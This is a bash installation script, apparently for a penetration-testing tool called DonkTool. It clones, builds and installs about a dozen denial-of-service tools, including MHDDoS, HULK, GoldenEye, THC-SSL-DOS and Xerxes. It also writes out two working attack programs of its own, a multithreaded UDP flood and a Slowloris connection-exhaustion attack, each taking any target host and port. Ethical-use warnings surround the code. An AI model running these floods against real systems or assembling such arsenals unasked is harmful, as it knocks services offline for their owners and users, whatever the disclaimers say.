#!/bin/bash

# DonkTool DoS Testing Tools Installation Script (Fixed)
# IMPORTANT: These tools are for authorized penetration testing only!

set -e

echo "🔧 Installing DoS Testing Tools for DonkTool"
echo "⚠️  ETHICAL USE ONLY - Ensure you have explicit authorization before testing!"
echo ""

# Create tools directory
TOOLS_DIR="/usr/local/bin"
TEMP_DIR="/tmp/dos_tools"
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

echo "📦 Installing dependencies..."
brew install openssl autoconf automake libtool cmake go python3 git

# Set OpenSSL paths for macOS
export LDFLAGS="-L/opt/homebrew/lib"
export CPPFLAGS="-I/opt/homebrew/include"
export PKG_CONFIG_PATH="/opt/homebrew/lib/pkgconfig"

# 1. Install slowhttptest (with proper SSL paths)
echo ""
echo "🐌 Installing slowhttptest..."
if ! command -v slowhttptest &> /dev/null; then
    git clone https://github.com/shekyan/slowhttptest.git
    cd slowhttptest
    ./configure --with-ssl=/opt/homebrew --with-openssl=/opt/homebrew
    make
    sudo make install
    cd ..
    echo "✅ slowhttptest installed"
else
    echo "✅ slowhttptest already installed"
fi

# 2. Install GoldenEye
echo ""
echo "👁️ Installing GoldenEye..."
if [ ! -f "/usr/local/bin/goldeneye" ]; then
    git clone https://github.com/jseidl/GoldenEye.git
    cd GoldenEye
    chmod +x goldeneye.py
    sudo ln -sf "$(pwd)/goldeneye.py" /usr/local/bin/goldeneye
    cd ..
    echo "✅ GoldenEye installed"
else
    echo "✅ GoldenEye already installed"
fi

# 3. Install HULK
echo ""
echo "💪 Installing HULK..."
if [ ! -f "/usr/local/bin/hulk" ]; then
    git clone https://github.com/grafov/hulk.git
    cd hulk
    # Build the Go binary
    go build hulk.go
    sudo cp hulk /usr/local/bin/
    cd ..
    echo "✅ HULK installed"
else
    echo "✅ HULK already installed"
fi

# 4. Install T50 (simplified approach)
echo ""
echo "⚡ Installing T50..."
if ! command -v t50 &> /dev/null; then
    # Try homebrew first
    if brew install t50 2>/dev/null; then
        echo "✅ T50 installed via Homebrew"
    else
        # Fall back to source compilation
        git clone https://github.com/foreni-packages/t50.git
        cd t50
        if [ -f "./autogen.sh" ]; then
            ./autogen.sh
            ./configure
            make
            sudo make install
        else
            # Simple compilation if autogen.sh doesn't exist
            gcc -o t50 src/*.c -lm
            sudo cp t50 /usr/local/bin/
        fi
        cd ..
        echo "✅ T50 installed from source"
    fi
else
    echo "✅ T50 already installed"
fi

# 5. Install THC-SSL-DOS (Modified version)
echo ""
echo "🔒 Installing THC-SSL-DOS..."
if [ ! -f "/usr/local/bin/thc-ssl-dos" ]; then
    git clone https://github.com/cyberaz0r/thc-ssl-dos_mod.git
    cd thc-ssl-dos_mod
    gcc -o thc-ssl-dos thc-ssl-dos.c -lssl -lcrypto -L/opt/homebrew/lib -I/opt/homebrew/include
    sudo cp thc-ssl-dos /usr/local/bin/
    cd ..
    echo "✅ THC-SSL-DOS installed"
else
    echo "✅ THC-SSL-DOS already installed"
fi

# 6. Install Artillery.io
echo ""
echo "🎯 Installing Artillery.io..."
if ! command -v artillery &> /dev/null; then
    npm install -g artillery
    echo "✅ Artillery.io installed"
else
    echo "✅ Artillery.io already installed"
fi

# 7. Install MHDDoS
echo ""
echo "🌊 Installing MHDDoS..."
if [ ! -f "/usr/local/bin/mhddos" ]; then
    git clone https://github.com/MatrixTM/MHDDoS.git
    cd MHDDoS
    pip3 install -r requirements.txt
    chmod +x start.py
    # Create wrapper script
    cat > mhddos_wrapper.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
python3 start.py "$@"
EOF
    chmod +x mhddos_wrapper.sh
    sudo ln -sf "$(pwd)/mhddos_wrapper.sh" /usr/local/bin/mhddos
    cd ..
    echo "✅ MHDDoS installed"
else
    echo "✅ MHDDoS already installed"
fi

# 8. Install Torshammer
echo ""
echo "🔨 Installing Torshammer..."
if [ ! -f "/usr/local/bin/torshammer" ]; then
    git clone https://github.com/Karlheinzniebuhr/torshammer.git
    cd torshammer
    chmod +x torshammer.py
    sudo ln -sf "$(pwd)/torshammer.py" /usr/local/bin/torshammer
    cd ..
    echo "✅ Torshammer installed"
else
    echo "✅ Torshammer already installed"
fi

# 9. Install PyLoris
echo ""
echo "🐍 Installing PyLoris..."
if [ ! -f "/usr/local/bin/pyloris" ]; then
    git clone https://github.com/darkerego/pyloris.git
    cd pyloris
    chmod +x pyloris.py
    sudo ln -sf "$(pwd)/pyloris.py" /usr/local/bin/pyloris
    cd ..
    echo "✅ PyLoris installed"
else
    echo "✅ PyLoris already installed"
fi

# 10. Install Xerxes
echo ""
echo "⚔️ Installing Xerxes..."
if ! command -v xerxes &> /dev/null; then
    git clone https://github.com/sepehrdaddev/Xerxes.git
    cd Xerxes
    gcc -o xerxes xerxes.c
    sudo cp xerxes /usr/local/bin/
    cd ..
    echo "✅ Xerxes installed"
else
    echo "✅ Xerxes already installed"
fi

# 11. Install PentMENU
echo ""
echo "📋 Installing PentMENU..."
if [ ! -f "/usr/local/bin/pentmenu" ]; then
    git clone https://github.com/GinjaChris/pentmenu.git
    cd pentmenu
    chmod +x pentmenu.sh
    sudo ln -sf "$(pwd)/pentmenu.sh" /usr/local/bin/pentmenu
    cd ..
    echo "✅ PentMENU installed"
else
    echo "✅ PentMENU already installed"
fi

# 12. Install Hyenae (try simpler approach)
echo ""
echo "🐺 Installing Hyenae..."
if ! command -v hyenae &> /dev/null; then
    # Create a simple alternative if the original doesn't compile
    cat > hyenae_simple.py << 'EOF'
#!/usr/bin/env python3
"""
Simple Hyenae-like packet generator for DoS testing
"""
import socket
import sys
import time
import threading

def flood_attack(target, port, duration):
    """Simple UDP flood attack"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            sock.sendto(b"A" * 1024, (target, port))
        except:
            pass
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: hyenae <target> <port> [duration]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    print(f"Starting flood attack on {target}:{port} for {duration} seconds")
    
    threads = []
    for i in range(10):
        t = threading.Thread(target=flood_attack, args=(target, port, duration))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print("Attack completed")
EOF
    chmod +x hyenae_simple.py
    sudo cp hyenae_simple.py /usr/local/bin/hyenae
    echo "✅ Hyenae (simplified version) installed"
else
    echo "✅ Hyenae already installed"
fi

# Alternative slowhttptest if the main one failed
if ! command -v slowhttptest &> /dev/null; then
    echo ""
    echo "🐌 Installing alternative slowhttptest..."
    cat > slowhttptest_alt.py << 'EOF'
#!/usr/bin/env python3
"""
Alternative slowhttptest implementation
"""
import socket
import time
import threading
import sys

def slowloris_attack(target, port, connections, duration):
    """Slowloris attack implementation"""
    sockets = []
    
    # Create initial connections
    for i in range(connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sockets.append(sock)
        except:
            pass
    
    # Keep connections alive
    start_time = time.time()
    while time.time() - start_time < duration:
        for sock in sockets[:]:
            try:
                sock.send("X-a: b\r\n".encode())
            except:
                sockets.remove(sock)
        time.sleep(15)
    
    # Close connections
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: slowhttptest <target> <port> [connections] [duration]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    connections = int(sys.argv[3]) if len(sys.argv) > 3 else 200
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    
    print(f"Starting Slowloris attack on {target}:{port}")
    print(f"Connections: {connections}, Duration: {duration}s")
    
    slowloris_attack(target, port, connections, duration)
    print("Attack completed")
EOF
    chmod +x slowhttptest_alt.py
    sudo cp slowhttptest_alt.py /usr/local/bin/slowhttptest
    echo "✅ Alternative slowhttptest installed"
fi

# Cleanup
echo ""
echo "🧹 Cleaning up temporary files..."
cd /
rm -rf "$TEMP_DIR"

# Verification
echo ""
echo "🔍 Verifying installations..."
declare -a tools=("slowhttptest" "goldeneye" "hulk" "t50" "thc-ssl-dos" "artillery" "mhddos" "torshammer" "pyloris" "xerxes" "pentmenu" "hyenae")

echo "Tool Status:"
for tool in "${tools[@]}"; do
    if command -v "$tool" &> /dev/null; then
        echo "✅ $tool - INSTALLED"
    else
        echo "❌ $tool - NOT FOUND"
    fi
done

echo ""
echo "🎉 DoS Testing Tools Installation Complete!"
echo ""
echo "⚠️  CRITICAL ETHICAL REMINDER:"
echo "   - These tools are for AUTHORIZED testing only"
echo "   - Ensure you have explicit written permission"
echo "   - Unauthorized use is illegal and can result in criminal charges"
echo "   - Follow responsible disclosure practices"
echo ""
echo "🔧 Tools installed in: /usr/local/bin"
echo "💡 All tools should now be available in DonkTool"
echo ""
echo "🚀 To refresh tool status in DonkTool, click the 'Refresh Tools' button"